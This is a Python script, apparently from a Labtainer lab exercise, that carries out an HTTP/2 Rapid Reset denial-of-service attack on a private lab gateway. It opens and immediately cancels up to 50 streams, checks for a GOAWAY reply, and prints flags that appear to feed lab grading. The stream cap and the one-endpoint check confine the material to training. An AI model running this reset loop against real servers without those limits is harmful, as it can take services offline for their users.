#!/usr/bin/env python3
import select
import socket
import ssl
import time
from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.errors import ErrorCodes
from h2.events import ConnectionTerminated

HOST="192.168.10.2"
PORT=8443
MAX_STREAMS=50

print("=== HTTP/2 RAPID RESET - LAB ONLY ===")
print("Giới hạn cứng: tối đa 50 stream trong mạng Labtainer.")

try:
    count=int(input("Nhập số stream muốn thử (1-50): ").strip())
except ValueError:
    raise SystemExit("Số stream không hợp lệ.")

if count < 1 or count > MAX_STREAMS:
    raise SystemExit("Chỉ được nhập từ 1 đến 50.")

endpoint=input("Nhập endpoint [/lab/slow-read]: ").strip()
if endpoint != "/lab/slow-read":
    raise SystemExit("Lab chỉ cho phép endpoint vô hại: /lab/slow-read")

ctx=ssl.create_default_context()
ctx.check_hostname=False
ctx.verify_mode=ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

raw=socket.create_connection((HOST, PORT), timeout=5)
sock=ctx.wrap_socket(raw, server_hostname="portal.lab")

if sock.selected_alpn_protocol() != "h2":
    raise SystemExit("Gateway không thương lượng HTTP/2.")

h2=H2Connection(H2Configuration(client_side=True, header_encoding="utf-8"))
h2.initiate_connection()
sock.sendall(h2.data_to_send())

def received_goaway():
    ready, _, _ = select.select([sock], [], [], 0.03)
    if not ready:
        return False

    try:
        data=sock.recv(65535)
    except (socket.timeout, ssl.SSLError):
        return False

    if not data:
        return True

    for ev in h2.receive_data(data):
        if isinstance(ev, ConnectionTerminated):
            return True

    return False

sent=0
goaway=False

for _ in range(count):
    sid=h2.get_next_available_stream_id()

    h2.send_headers(sid, [
        (":method", "GET"),
        (":scheme", "https"),
        (":authority", "portal.lab"),
        (":path", endpoint)
    ], end_stream=True)

    h2.reset_stream(sid, error_code=ErrorCodes.CANCEL)

    try:
        sock.sendall(h2.data_to_send())
        sent += 1
    except (BrokenPipeError, ConnectionResetError, ssl.SSLError):
        goaway=True
        break

    # Vẫn là Rapid Reset trong cửa sổ 2 giây,
    # nhưng cho gateway cơ hội trả GOAWAY khi đã vượt ngưỡng.
    time.sleep(0.05)

    if received_goaway():
        goaway=True
        break

sock.close()

print(f"Stream đã gửi thực tế: {sent}/{count}")
print("GOAWAY_ENHANCE_YOUR_CALM=" + ("yes" if goaway else "no"))
print("attacker_started=yes")
print("rapid_reset_sent=yes")
